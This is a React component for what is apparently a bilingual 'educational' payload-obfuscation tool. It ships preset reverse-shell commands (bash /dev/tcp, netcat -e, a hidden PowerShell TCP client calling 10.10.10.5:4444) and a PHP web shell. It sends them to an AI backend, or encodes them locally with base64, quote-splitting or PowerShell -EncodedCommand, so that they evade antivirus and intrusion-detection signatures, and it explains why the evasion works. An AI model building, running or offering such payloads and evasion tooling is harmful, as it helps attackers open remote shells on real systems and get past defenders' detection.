import React, { useState } from "react";
import { Copy, Check, Sparkles, AlertTriangle, ShieldCheck, Cpu, RefreshCw, Terminal } from "lucide-react";

interface PayloadHelperProps {
  lang: "it" | "en";
}

export default function PayloadHelper({ lang }: PayloadHelperProps) {
  const [originalPayload, setOriginalPayload] = useState<string>("bash -i >& /dev/tcp/10.10.10.5/4444 0>&1");
  const [encoderType, setEncoderType] = useState<string>("base64-encode");
  const [loading, setLoading] = useState<boolean>(false);
  const [result, setResult] = useState<{ obfuscated: string; explanation: string } | null>(null);
  const [copied, setCopied] = useState<boolean>(false);

  const presets = [
    {
      label: "Bash Reverse Shell",
      code: "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
    },
    {
      label: "Netcat traditional",
      code: "nc -e /bin/bash 10.10.10.5 4444"
    },
    {
      label: "PowerShell command",
      code: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('10.10.10.5',4444)"
    },
    {
      label: "PHP Web Shell",
      code: "<?php system($_GET['cmd']); ?>"
    }
  ];

  const handleObfuscate = async () => {
    setLoading(true);
    setResult(null);
    try {
      const response = await fetch("/api/obfuscate-payload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payload: originalPayload,
          encoderType,
          lang
        })
      });

      if (!response.ok) {
        throw new Error("HTTP " + response.status);
      }

      const data = await response.json();
      setResult(data);
    } catch {
      // Fallback display if Gemini API fails or offline
      let fallbackText = "";
      if (encoderType === "base64-encode") {
        fallbackText = btoa(originalPayload);
      } else if (encoderType === "concatenation") {
        fallbackText = originalPayload.replace(/bash/g, "b'a's'h");
      } else {
        fallbackText = `powershell -EncodedCommand ${btoa(originalPayload)}`;
      }

      setResult({
        obfuscated: fallbackText,
        explanation: lang === "it"
          ? "I sistemi anti-intrusione basati su firma statica (come i filtri snort o gli antivirus vecchio stile) spesso guardano stringhe letterali specifiche come '/dev/tcp' o 'system'. Utilizzando codifiche temporanee o costrutti dinamici (es. concatenazione), la stringa malvagia viene assemblata solo in memoria a runtime, eludendo la scansione a riposo."
          : "Static signature intrusion detection systems (like legacy Windows Defender rules or Snort patterns) look for plain substrings such as '/dev/tcp' or 'system'. By using dynamic string execution construct or Base64 sequences, the trigger is obscured during transit and parsed in-memory at execution time."
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-[#111827] border border-slate-800 rounded p-5 shadow-xl font-sans" id="payload-evasion-panel">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 pb-4 mb-5">
        <div>
          <h2 className="text-sm font-semibold text-slate-100 flex items-center gap-2">
            <Cpu className="text-indigo-400 w-4 h-4" />
            {lang === "it" ? "Ingegnere di Payload & Evasione Didattica" : "Payload Engineering & Educational Evasion"}
          </h2>
          <p className="text-xs text-slate-400 mt-0.5">
            {lang === "it"
              ? "Studia la firma statica dei payload exploit e offuscali con l'AI per eludere i filtri di pattern matching."
              : "Analyze the static signatures of exploit payloads and obscure them with AI to evade pattern-matching filters."}
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Side: Input configuration */}
        <div className="lg:col-span-6 flex flex-col gap-4">
          <div className="flex flex-col gap-2">
            <span className="text-[10px] uppercase font-bold text-slate-500 tracking-wider font-mono">
              {lang === "it" ? "Template di Partenza Pronti" : "Quick Shell Presets"}
            </span>
            <div className="flex flex-wrap gap-2">
              {presets.map((preset, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    setOriginalPayload(preset.code);
                    setResult(null);
                  }}
                  className="bg-[#0f172a] hover:bg-slate-800 border border-slate-800 hover:border-slate-700 text-slate-350 px-2.5 py-1.5 rounded text-[11px] font-mono transition"
                >
                  {preset.label}
                </button>
              ))}
            </div>
          </div>

          <div className="flex flex-col gap-1.5 font-mono">
            <span className="text-[10px] uppercase font-bold text-slate-400 tracking-wider">
              {lang === "it" ? "Payload in Chiaro" : "Cleartext Payload Raw String"}
            </span>
            <textarea
              value={originalPayload}
              onChange={(e) => {
                setOriginalPayload(e.target.value);
                setResult(null);
              }}
              rows={4}
              className="w-full bg-[#0f172a] border border-slate-800 focus:border-indigo-500/60 text-slate-300 font-mono p-3 rounded text-xs select-all outline-none"
              placeholder="bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
            />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="flex flex-col gap-1.5">
              <label className="text-xs font-semibold text-slate-300">
                {lang === "it" ? "Metodologia di Evasione" : "Evasion Pattern Method"}
              </label>
              <select
                value={encoderType}
                onChange={(e) => {
                  setEncoderType(e.target.value);
                  setResult(null);
                }}
                className="bg-[#0f172a] border border-slate-800 focus:border-indigo-500/60 text-slate-200 px-3 py-2 rounded text-xs outline-none transition"
              >
                <option value="base64-encode">Base64 Transit Encoding</option>
                <option value="concatenation">Bash Quote Splitting (b'a's'h)</option>
                <option value="powershell-bypass">Powershell Bypass Execution</option>
                <option value="hex-formatting">Hexadecimal Char Codes</option>
              </select>
            </div>

            <div className="flex items-end">
              <button
                onClick={handleObfuscate}
                disabled={loading || !originalPayload.trim()}
                className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 px-4 rounded text-xs flex items-center justify-center gap-1.5 transition disabled:opacity-50 h-9 shrink-0 cursor-pointer"
              >
                {loading ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    {lang === "it" ? "Offuscamento..." : "Obfuscating..."}
                  </>
                ) : (
                  <>
                    <Sparkles className="w-3.5 h-3.5" />
                    {lang === "it" ? "Rigenera Payload AI" : "Process Evasion AI"}
                  </>
                )}
              </button>
            </div>
          </div>

          <div className="bg-[#0b111e] border border-slate-850 p-3.5 rounded text-[11px] leading-relaxed text-slate-400">
            <p className="flex items-start gap-2">
              <AlertTriangle className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" />
              <span>
                {lang === "it"
                  ? "I filtri e gli Antivirus moderni utilizzano l'analisi euristica e l'ispezione della memoria (AMSI / ETW). Sebbene l'offuscamento di stringa aggiri i log d'ispezione web semplice, non sostituisce pratiche di bypass a livello di memoria o API nativa."
                  : "Modern EDRs and Antiviral software analyze heuristics and behavior at execution time (AMSI / ETW hooks). Obfuscation works against simple inline web firewalls, but won't solve strict behavioral restrictions."}
              </span>
            </p>
          </div>
        </div>

        {/* Right Side: Generated payload and academic explanation */}
        <div className="lg:col-span-6 flex flex-col gap-4">
          {result ? (
            <div className="flex flex-col gap-4 animate-fadeIn">
              <div className="flex flex-col gap-1.5">
                <div className="flex items-center justify-between text-[10px] uppercase font-bold text-slate-400 tracking-wider">
                  <span>{lang === "it" ? "Payload Offuscabile Risultante" : "Resulting Obfuscated Command"}</span>
                  <button
                    onClick={() => handleCopy(result.obfuscated)}
                    className="text-indigo-400 hover:text-indigo-300 flex items-center gap-1 transition"
                  >
                    {copied ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                    {copied ? (lang === "it" ? "Copiato!" : "Copied!") : (lang === "it" ? "Copia" : "Copy")}
                  </button>
                </div>
                <div className="bg-[#0f172a] border border-slate-800 rounded p-4 font-mono text-[11.5px] select-all break-all leading-normal text-slate-200">
                  {result.obfuscated}
                </div>
              </div>

              <div className="bg-[#0f172a] border border-slate-800 rounded p-4 relative">
                <div className="flex items-center gap-1.5 text-indigo-400 text-xs font-bold uppercase tracking-wider mb-2 border-b border-slate-800 pb-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  <span>{lang === "it" ? "Analisi di Evasione Didattica" : "Evasion Technique Guide"}</span>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">
                  {result.explanation}
                </p>
              </div>
            </div>
          ) : (
            <div className="border border-dashed border-slate-800 rounded-lg flex flex-col items-center justify-center p-10 text-center h-full min-h-[250px] bg-slate-900/10">
              <Terminal className="w-10 h-10 text-slate-600 mb-2" />
              <p className="text-xs text-slate-500 max-w-sm">
                {lang === "it"
                  ? "Configura un payload exploit a sinistra e avvia l'elaboratore per visualizzare la variante anti-firma e comprenderne le dinamiche esterne."
                  : "Specify an exploit string and tap the process button to examine its obfuscated variant and study signature defense-bypass vectors."}
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
